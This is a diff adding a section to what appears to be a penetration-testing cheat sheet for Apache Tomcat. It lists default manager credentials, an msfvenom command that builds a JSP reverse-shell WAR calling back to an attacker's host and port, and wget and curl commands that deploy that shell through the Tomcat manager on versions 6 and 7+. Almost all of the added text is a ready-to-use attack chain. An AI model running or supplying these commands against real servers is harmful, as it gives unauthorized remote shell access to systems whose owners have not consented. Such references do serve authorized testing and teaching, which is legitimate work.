@@ -33,11 +33,32 @@
 #### Default Credentials
 
 <code>admin:admin</code>
+
 <code>tomcat:tomcat</code>
+
 <code>admin:[NOTHING]</code>
+
 <code>admin:s3cr3t</code>
+
 <code>tomcat:s3cr3t</code>
+
 <code>admin:tomcat</code>
+
+#### Payload
+
+<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war</code>
+
+##### Uploading to Tomcat6
+
+<code>wget 'http://[USER]:[password]@[IP]:8080/manager/deploy?war=file:shell.war&path=/shell' -O -</code>
+
+##### Uploading to Tomcat7 and Above
+
+<code>curl -v -u [USER]:[PASSWORD]] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>
+
+
+
+
 
 ## FTP 
 
